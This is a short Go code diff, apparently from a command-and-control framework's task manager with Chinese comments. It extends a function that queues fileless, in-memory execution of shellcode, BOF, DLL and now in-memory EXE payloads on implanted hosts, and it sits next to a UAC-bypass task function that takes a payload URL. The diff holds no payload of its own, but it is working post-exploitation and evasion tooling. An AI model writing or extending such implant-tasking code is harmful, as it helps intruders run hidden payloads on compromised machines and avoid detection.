@@ -346,18 +346,23 @@ func (m *Manager) CreateUACBypass(sessionID, payloadURL string) (*types.TaskInfo
 }
 
 // CreateFilelessExec 创建全内存无文件执行任务。
-// kind ∈ {shellcode, bof, dll}；payloadB64 为载荷的 base64 编码；args/entry 为可选参数
-// （BOF 参数 / DLL 导出函数名）。
-func (m *Manager) CreateFilelessExec(sessionID, kind, payloadB64, args, entry string) (*types.TaskInfo, error) {
-	data, _ := json.Marshal(map[string]string{
+// kind ∈ {shellcode, bof, dll, exe_mem}；payloadB64 为载荷的 base64 编码；
+// args/entry 为可选参数（BOF 参数 / EXE 命令行 / DLL 导出函数名与镜像名）；
+// waitMs > 0 时植入端等待执行线程结束（仅 exe_mem 取值）。
+func (m *Manager) CreateFilelessExec(sessionID, kind, payloadB64, args, entry string, waitMs int) (*types.TaskInfo, error) {
+	data := map[string]interface{}{
 		"kind":        kind,
 		"payload_b64": payloadB64,
 		"args":        args,
 		"entry":       entry,
-	})
+	}
+	if waitMs > 0 {
+		data["wait_ms"] = waitMs
+	}
+	raw, _ := json.Marshal(data)
 	return m.Create(sessionID, TaskParams{
 		TaskType: TaskTypeFilelessExec,
-		Data:     string(data),
+		Data:     string(raw),
 	})
 }
 
